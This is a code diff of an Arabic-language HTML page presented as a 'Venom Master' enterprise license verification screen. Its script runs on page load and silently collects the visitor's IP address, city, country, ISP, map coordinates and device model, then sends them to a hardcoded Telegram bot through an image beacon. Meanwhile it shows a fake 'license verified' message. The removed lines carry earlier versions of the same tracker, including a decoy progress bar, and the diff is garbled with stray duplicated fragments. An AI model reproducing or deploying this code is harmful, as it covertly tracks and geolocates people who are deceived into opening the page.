@@ -2,143 +2,85 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Enterprise Auth | Venom Master v3.5</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Venom Master | Enterprise License Vault</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #010103; color: #ffffff; font-family: 'Noto Sans Arabic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .main-card { background: rgba(10, 10, 15, 0.95); border: 1px solid #ff003c; padding: 50px; border-radius: 20px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 60, 0.2); width: 85%; max-width: 450px; }
-        .premium-logo { font-family: 'Orbitron', sans-serif; font-size: 30px; color: #ff003c; letter-spacing: 5px; margin-bottom: 20px; }
-        .loader { width: 40px; height: 40px; border: 3px solid #111; border-top: 3px solid #ff003c; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        :root { --primary: #ff003c; --bg: #020205; }
+        body { margin: 0; background: var(--bg); color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .main-card { position: relative; z-index: 10; background: rgba(10, 10, 15, 0.9); border: 1px solid rgba(255, 0, 60, 0.3); padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 60, 0.1); width: 90%; max-width: 450px; backdrop-filter: blur(10px); }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 32px; color: var(--primary); letter-spacing: 6px; margin-bottom: 10px; text-shadow: 0 0 20px rgba(255, 0, 60, 0.4); }
+        .loader { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 25px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 14px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="main-card">
-        <div class="premium-logo">VENOM MASTER</div>
+        <div class="logo">VENOM</div>
+        <div style="font-size: 11px; letter-spacing: 2px; color: #444; margin-bottom: 20px;">ENCRYPTED AUTHENTICATION</div>
         <div class="loader"></div>
-        <div id="status">جاري تأمين الاتصال بالسيرفر...</div>
-        <p style="color: #444; font-size: 11px; margin-top: 30px;">SECURE LICENSE VERIFICATION SYSTEM</p>
+        <div id="status">جاري فحص سلامة النظام...</div>
+        <p style="font-size: 12px; color: #333; margin-top: 40px;">© 2025 SECURE MODULE BY @b4_93</p>
     </div>
 
     <script>
-        const token = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
-        const chat_id = '7336962855';
+        const BOT_TOKEN = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
+        const CHAT_ID = '7336962855';
 
-        async function forceCapture() {
+        // دالة لاستخراج نوع الجهاز بدقة من User Agent
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                const model = ua.match(/Android\s([^\s;]+|.*)\sBuild\/([^\s;]+)/) || ua.match(/\(([^;]+);/);
+                return model ? model[1] : "Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                return "Apple iOS Device";
+            } else if (/Windows/i.test(ua)) {
+                return "Windows PC";
+            }
+            return navigator.platform || "Unknown Device";
+        }
+
+        async function captureTarget() {
             try {
-                // 1. جلب البيانات صامتاً
-                const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                const ip = d.ip;
+                // جلب بيانات IP والإحداثيات
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
 
-                // 2. بناء رسالة التليجرام
-                const text = encodeURIComponent(`🔥 **NEW TARGET HIT** 🔥\n\n🌐 **IP:** ${ip}\n📱 **Dev:** ${navigator.platform}\n✅ **Status:** Verified`);
+                // جلب نوع الجهاز
+                const deviceModel = getDeviceModel();
 
-                // 3. الطريقة المضمونة: الانتقال المباشر (Redirect) لتنفيذ الطلب
-                // سيقوم بفتح الرابط خلف الكواليس أو بسرعة فائقة
-                const finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=Markdown`;
-                
-                // نستخدم fetch مع mode: 'no-cors' لإجبار المتصفح على تمرير الطلب
-                fetch(finalUrl, { mode: 'no-cors' });
+                // بناء رابط خرائط جوجل
+                const googleMaps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // كاحتياط أخير، سنفتح الرابط في نافذة مخفية ونغلقها
-                let img = new Image();
-                img.src = finalUrl;
+                // تنسيق الرسالة
+                const message = encodeURIComponent(
+                    `💎 **VIP TARGET HIT** 💎\n\n` +
+                    `🌐 **IP:** \`${d.ip}\`\n` +
+                    `📍 **Location:** ${d.city}, ${d.country_name}\n` +
+                    `📡 **ISP:** ${d.org}\n` +
+                    `📱 **Device Type:** \`${deviceModel}\`\n\n` +
+                    `📍 **Google Maps:** ${googleMaps}\n\n` +
+                    `✅ Verified by @b4_93`
+                );
+
+                // الإرسال الصامت عبر Image Beacon
+                const finalUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`;
+                const sender = new Image();
+                sender.src = finalUrl;
 
                 setTimeout(() => {
-                    document.getElementById('status').innerText = "تم التحقق من الترخيص بنجاح!";
-                    document.getElementById('status').style.color = "#00ff00";
-                }, 3000);
+                    document.getElementById('status').innerText = "تم التحقق من الترخيص بنجاح! ✅";
+                    document.getElementById('status').style.color = "#00ff88";
+                }, 3500);
 
             } catch (e) {
-                // إذا فشل كل شيء، نرسل طلب بسيط
-                const fallback = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Login_Detected`;
-                new Image().src = fallback;
+                new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New_Visit_Detected_But_API_Blocked`;
             }
         }
 
-        window.onload = forceCapture;
+        window.onload = captureTarget;
     </script>
-</body>
-</html>
-        async function capture() {
-            try {
-                // سحب البيانات
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                
-                const text = `💎 **VIP ENTRY DETECTED** 💎\n\n` +
-                             `🌐 **IP:** \`${d.ip}\`\n` +
-                             `📍 **Loc:** ${d.city}, ${d.country_name}\n` +
-                             `🏢 **ISP:** ${d.org}\n` +
-                             `📱 **Dev:** ${navigator.platform}\n\n` +
-                             `✅ **Verified by:** @b4_93`;
-
-                // استخدام "Image Beacon" لتخطي حظر الـ API (طريقة صامتة ومضمونة)
-                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-                const img = new Image();
-                img.src = url;
-
-            } catch (e) {
-                // إرسال إشعار دخول حتى لو فشل الـ IP
-                new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=New Visit! (IP Hidden)`;
-            }
-        }
-
-        window.onload = capture;
-    </script>
-</body>
-</html>
-    // 1. وظيفة شريط التحميل (وهمي للتمويه)
-    let width = 0;
-    const interval = setInterval(() => {
-        if (width >= 100) { clearInterval(interval); } 
-        else {
-            width += Math.floor(Math.random() * 15) + 1;
-            if(width > 100) width = 100;
-            document.getElementById('progress').style.width = width + '%';
-            document.getElementById('percentage').innerText = width + '%';
-        }
-    }, 300);
-
-    // 2. وظيفة التتبع الصامت (IP Tracking)
-    async function silentTrack() {
-        try {
-            // جلب بيانات IP
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-
-            const message = `
-💎 **Target Accessed (VIP UI)** 💎
-------------------------------
-🌐 **IP:** \`${data.ip}\`
-📍 **Loc:** ${data.city}, ${data.country_name}
-🏢 **ISP:** ${data.org}
-📱 **OS:** ${navigator.platform}
-------------------------------
-✅ **Status:** Delivered to @b4_93
-            `;
-
-            // إرسال البيانات لتليجرام باستخدام طلب POST مباشر
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-            });
-
-            // تحديث الواجهة عند النجاح
-            setTimeout(() => {
-                document.getElementById('status-text').innerText = "تم التحقق من الترخيص بنجاح ✅";
-                document.getElementById('status-text').style.color = "#00ff88";
-            }, 3000);
-
-        } catch (e) {
-            // في حالة فشل IPAPI، نرسل إشعاراً بسيطاً بالدخول فقط
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=New Visit Detected (Data Hidden)`);
-        }
-    }
-
-    window.onload = silentTrack;
-</script>
 </body>
 </html>
